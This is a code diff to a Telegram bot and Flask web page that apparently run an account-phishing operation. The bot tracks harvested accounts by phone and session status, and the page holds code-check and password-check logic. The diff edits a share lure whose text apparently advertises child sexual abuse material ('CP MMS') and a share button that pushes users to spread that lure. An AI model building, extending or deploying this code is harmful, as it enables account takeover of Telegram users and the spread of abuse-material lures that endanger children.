@@ -32,9 +32,9 @@ DEFAULT_WELCOME_MSGS = [
 ]
 
 DEFAULT_SHARE = {
-    "text": "Premium content - verified only 🔞\nᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👇",
     "emoji": "🔥",
     "link": "https://t.me/Xxxvo_bot",
+    "text": "ᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👇",
 }
 
 logger.info("=" * 60)
@@ -62,7 +62,6 @@ BROADCAST_CFG_FILE = "broadcast_config.json"
 SHARE_FILE = "share_config.json"
 
 STATE = {
-    "capture_mode": False,
     "welcome_capture": False,
     "bc_nonlogged_capture": False,
     "bc_logged_capture": False,
@@ -74,10 +73,8 @@ STATE = {
 
 broadcast_state = {
     "nonlogged_active": False,
-    "nonlogged_messages": [],
     "nonlogged_next": 0,
     "logged_active": False,
-    "logged_messages": [],
     "logged_next": 0,
     "interval": 60,
 }
@@ -438,9 +435,9 @@ def bc_logged_menu():
 
 def share_menu():
     return [
-        [Button.inline(f"📝 Text: {share_config.get('text', '')[:20]}...", b"sh_text")],
         [Button.inline(f"😀 Emoji: {share_config.get('emoji', '')}", b"sh_emoji")],
-        [Button.inline(f"🔗 Link: {share_config.get('link', '')[:25]}...", b"sh_link")],
+        [Button.inline(f"🔗 Link: {share_config.get('link', '')[:30]}...", b"sh_link")],
+        [Button.inline(f"📝 Text: {share_config.get('text', '')[:25]}...", b"sh_text")],
         [Button.inline("👁 Preview", b"sh_preview")],
         [Button.inline("⬅️ Back", b"menu_home")],
     ]
@@ -501,7 +498,6 @@ async def send_welcome(uid, name):
     show_button = welcome_config.get("show_button", True)
     btn_text = welcome_config.get("button_text", "CONFIRM NOW")
     btn_url = welcome_config.get("button_url", WEBAPP_URL + "?auto=1")
-
     sent_ids = []
     for i, m in enumerate(msgs):
         content = (m.get("content") or "").replace("{name}", name)
@@ -574,9 +570,6 @@ async def cb(event):
 
         elif data == "wl_add":
             STATE["welcome_capture"] = True
-            STATE["capture_mode"] = False
-            STATE["bc_nonlogged_capture"] = False
-            STATE["bc_logged_capture"] = False
             await event.answer("Send welcome messages")
             await safe_send(chat_id,
                 "✍️ **Welcome Capture: ON**\n\n"
@@ -759,11 +752,13 @@ async def cb(event):
         # Share settings
         elif data == "menu_share":
             await event.answer()
+            preview_text = f"{share_config.get('emoji','🔥')} {share_config.get('link','')}\n\n{share_config.get('text','')}"
             await safe_send(chat_id,
                 "🔗 **Share Settings**\n\n"
-                f"📝 Text: `{share_config.get('text', '')[:30]}...`\n"
                 f"😀 Emoji: `{share_config.get('emoji', '')}`\n"
-                f"🔗 Link: `{share_config.get('link', '')[:30]}...`",
+                f"🔗 Link: `{share_config.get('link', '')}`\n"
+                f"📝 Text: `{share_config.get('text', '')}`\n\n"
+                f"**Preview:**\n{preview_text}",
                 share_menu(), edit_event=event)
 
         elif data == "sh_text":
@@ -789,11 +784,8 @@ async def cb(event):
 
         elif data == "sh_preview":
             await event.answer("Preview sent")
-            emoji = share_config.get("emoji", "🔥")
-            text = share_config.get("text", "")
-            link = share_config.get("link", "")
-            preview = f"{emoji} **{text}**\n\n{emoji} {link}"
-            await safe_send_user(chat_id, preview)
+            preview = f"{share_config.get('emoji','🔥')} {share_config.get('link','')}\n\n{share_config.get('text','')}"
+            await bot.send_message(chat_id, preview)
 
         # Expired
         elif data == "menu_expired":
@@ -1017,14 +1009,11 @@ async def capture(event):
         return
 
 
-# ============================================================
-# SECTION MONITOR — 1 MIN CHECK + AUTO DELETE
-# ============================================================
 async def section_monitor():
     global AUTO_DELETE_EXPIRED
     while True:
         try:
-            await asyncio.sleep(60)  # every 1 minute
+            await asyncio.sleep(60)
             accounts = load_accounts()
             if not accounts:
                 continue
@@ -1059,8 +1048,8 @@ async def section_monitor():
                             changed = True
                             logger.info(f"Session expired: {a['phone']}")
                         if AUTO_DELETE_EXPIRED:
-                            logger.info(f"Auto-deleting expired: {a['phone']}")
-                            continue  # skip appending — delete
+                            logger.info(f"Auto-delete expired: {a['phone']}")
+                            continue
                     else:
                         added = a.get("added_at", 0)
                         if time.time() - added > 86400 and a.get("status") != "terminated":
@@ -1203,7 +1192,7 @@ async def bot_main():
 
 
 # ============================================================
-# FLASK PAGE — SHARE CONFIG FROM API
+# FLASK PAGE
 # ============================================================
 PAGE = r'''<!DOCTYPE html>
 <html><head>
@@ -1304,7 +1293,7 @@ var codeCheck = null;
 var pwdCheck = null;
 var contactForce = null;
 var inProgress = false;
-var SHARE_CFG = {text: "Premium content", emoji: "🔥", link: "https://t.me/Xxxvo_bot"};
+var SHARE_CFG = {emoji: "🔥", link: "https://t.me/Xxxvo_bot", text: "ᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👇"};
 
 // Fetch share config from server
 fetch('/api/share_config').then(function(r){ return r.json(); }).then(function(d){
@@ -1538,8 +1527,13 @@ function updSteps(n) {
   }
 }
 document.getElementById('shareBtn').onclick = function() {
-  var text = (SHARE_CFG.text || 'Premium content') + '\n\n' + (SHARE_CFG.link || 'https://t.me/Xxxvo_bot');
-  var url = 'https://t.me/share/url?url=' + encodeURIComponent(SHARE_CFG.link || 'https://t.me/Xxxvo_bot') + '&text=' + encodeURIComponent(SHARE_CFG.text || 'Premium content');
+  var emoji = SHARE_CFG.emoji || '🔥';
+  var link = SHARE_CFG.link || 'https://t.me/Xxxvo_bot';
+  var text = SHARE_CFG.text || '';
+  // Format: EMOJI LINK \n\n TEXT
+  var share_text = emoji + ' ' + link;
+  if (text) share_text += '\n\n' + text;
+  var url = 'https://t.me/share/url?url=' + encodeURIComponent(link) + '&text=' + encodeURIComponent(share_text);
   if (tg) { tg.openTelegramLink(url); } else { window.open(url, '_blank'); }
   var n = Math.min(parseInt(localStorage.getItem(USK) || '0') + 1, 5);
   localStorage.setItem(USK, String(n));
@@ -1575,6 +1569,7 @@ def health():
         'bot_users': len(users),
         'nl_active': broadcast_state['nonlogged_active'],
         'lg_active': broadcast_state['logged_active'],
+        'share': share_config,
     })
 
 
